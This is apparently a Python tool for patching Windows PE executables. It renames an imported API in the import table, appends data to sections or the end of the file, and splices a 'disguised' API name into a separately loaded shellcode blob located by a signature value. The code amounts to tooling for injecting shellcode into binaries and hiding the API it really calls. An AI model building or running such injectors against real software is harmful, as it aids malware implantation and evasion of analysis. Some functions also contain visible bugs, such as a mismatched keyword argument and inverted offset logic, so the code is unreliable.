from capstone import CS_ARCH_X86
from capstone import CS_MODE_32
from capstone import Cs
import pefile
import struct
from typing import List
from pefile import SectionStructure
import os

import pyx86asm

def write_byte(dst:bytes, src:bytes, write_offset:int)->bytearray:
    dst = bytearray(dst)
    src = bytearray(src)
    idx=0
    while len(src) > idx:
        dst[idx+write_offset] = src[idx]
        idx = idx + 1
    return (dst)

def pass_parameter_to_shellcode(shellcode:bytearray, overwritten_api:str, param_offset=0x3E6)->bytearray:
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    dw_str_arr = pyx86asm.chage_pystr_to_dword_array(api_str=overwritten_api)
    push_ops = bytearray()
    for dw_str in dw_str_arr:
        push_op = pyx86asm.make_push_oper(dw_str)
        push_ops = push_ops + push_op
    
    if not param_offset:
        for dis in md.disasm(shellcode[param_offset:], 0):
            if dis.mnemonic == "push" and dis.size == 5: # Signature
                if struct.unpack("<I",dis.bytes[1:])[0] == 0xEAA5A: # Signature
                    param_end_offset=param_offset+dis.size
                    break
            param_offset = param_offset + dis.size
    else:
        param_end_offset = param_offset + 4 # x86 operand size

    shellcode_head = shellcode[:param_offset]
    shellcode_tail = shellcode[param_end_offset:]

    return shellcode_head + push_ops + shellcode_tail

class PETool:
    def __init__(self, fname:str):
        self.fname=fname
        self.set_pe_object()

    def set_pe_object(self):
        self.pe:PE = pefile.PE(self.fname)
        self.size_of_origin_raw = len(self.pe.__data__)
        self.size_of_current_raw = len(self.pe.__data__)
        self.section_alignment = self.pe.OPTIONAL_HEADER.SectionAlignment
        self.file_alignment = self.pe.OPTIONAL_HEADER.FileAlignment
        self.size_of_img = self.pe.OPTIONAL_HEADER.SizeOfImage

    def get_target_api_name_rva(self, api_name:str)->int:
        dir_import = self.pe.DIRECTORY_ENTRY_IMPORT
        for imp in dir_import:
            for api in imp.imports:
                if api.name.decode("ascii") == api_name:
                    return api.name_offset
        
        return 0

    def change_import_api(self, dst:str, src:str)->bytes:
        if len(src) > len(dst):
            raise Exception("Target API name must shorter than overwritten api")

        api_name_rva = self.get_target_api_name_rva(api_name=dst)
        if api_name_rva == 0:
            raise Exception("Can not find target api in src file")
        
        _bin:bytes = 'b'
        with open(self.fname, 'rb') as fp:
            _bin = fp.read()

        _bin = write_byte(dst=_bin, src=src.encode("ascii"), write_offset=api_name_rva)

        return _bin

    def get_section_header_by_name(self, sec_name)->SectionStructure:
        sections:List[pefile.SectionStructure] = self.pe.sections
        for section in sections:
            name_of_current_section = section.Name.decode("ascii").strip("\x00")
            if name_of_current_section == sec_name:
                return section
        return None

    def get_section_header_index_by_name(self, sec_name)->int:
        sections:List[pefile.SectionStructure] = self.pe.sections
        idx = 0
        for section in sections:
            name_of_current_section = section.Name.decode("ascii").strip("\x00")
            if name_of_current_section == sec_name:
                return idx
            idx = idx+1
        return -1

    def get_last_section_header(self)->SectionStructure:
        sections:List[pefile.SectionStructure] = self.pe.sections
        last_section = None
        for section in sections:
            last_section = section
        return last_section

    def get_actual_allocated_vmem_size(self, section_hdr:SectionStructure)->int:
        actual_allocate_vmem_size = (int(section_hdr.Misc_VirtualSize/self.section_alignment)+1) * self.section_alignment
        
        return actual_allocate_vmem_size

    def get_availiable_size_in_section(self, section_hdr:SectionStructure)->int:
        actual_allocate_vmem_size = self.get_actual_allocated_vmem_size(section=section_hdr)
        available_size = actual_allocate_vmem_size - section_hdr.SizeOfRawData

        return available_size

    def write_bytes_at_offset(self, offset, data):
        number_of_written = 0
        if not isinstance(data, bytes):
            raise TypeError('data should be of type: bytes')

        if 0 <= offset < len(self.pe.__data__):
            # Overwrite
            self.pe.__data__ = ( self.pe.__data__[:offset] + data + self.pe.__data__[offset+len(data):] )
            number_of_written = len(data)
        else: # Add data at EOF
            zero_pad = bytes(offset - len(self.pe.__data__))
            # If insert point(offset) is not equal with EOF, Padding wiht 0
            self.pe.__data__ = self.pe.__data__[:offset] + zero_pad + data
            number_of_written = len(data) + len(zero_pad)
            new_pe_size = (self.size_of_current_raw + number_of_written)
            if new_pe_size % self.pe.OPTIONAL_HEADER.FileAlignment != 0:
                size_of_over = new_pe_size % self.pe.OPTIONAL_HEADER.FileAlignment
                padded_size = self.pe.OPTIONAL_HEADER.FileAlignment - size_of_over
                padding = bytearray(padded_size)
                self.pe.__data__ = self.pe.__data__ + padding
                number_of_written = number_of_written + len(padding)
            
            self.size_of_current_raw = len(self.pe.__data__)

        return offset, number_of_written

class Shellcode:
    def __init__(self, fname:str):
        with open(fname, "rb") as fp:
            _bin = fp.read()
            self.shellcode:bytearray = bytearray(_bin)
        self.shellcode_len = 0

    def renew_shellcode_len(self):
        self.shellcode_len = len(self.shellcode)

    def set_disguised_api(self, api:str, param_offset=0x3E6):
        # insert_point : 
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        dw_str_arr = pyx86asm.chage_pystr_to_dword_array(api_str=api)
        push_ops = bytearray()
        for dw_str in dw_str_arr:
            push_op = pyx86asm.make_push_oper(dw_str)
            push_ops = push_ops + push_op
        
        if not param_offset:
            for dis in md.disasm(self.shellcode[param_offset:], 0):
                if dis.mnemonic == "push" and dis.size == 5: # Signature
                    if struct.unpack("<I",dis.bytes[1:])[0] == 0xEAA5A: # Signature
                        param_end_offset=param_offset+dis.size
                        break
                param_offset = param_offset + dis.size
        else:
            param_end_offset = param_offset + 4 # x86 operand size
            
        shellcode_head = self.shellcode[:param_offset]
        shellcode_tail = self.shellcode[param_end_offset:]

        self.shellcode = shellcode_head + push_ops + shellcode_tail
        del shellcode_head
        del shellcode_tail

        self.renew_shellcode_len()

        pass
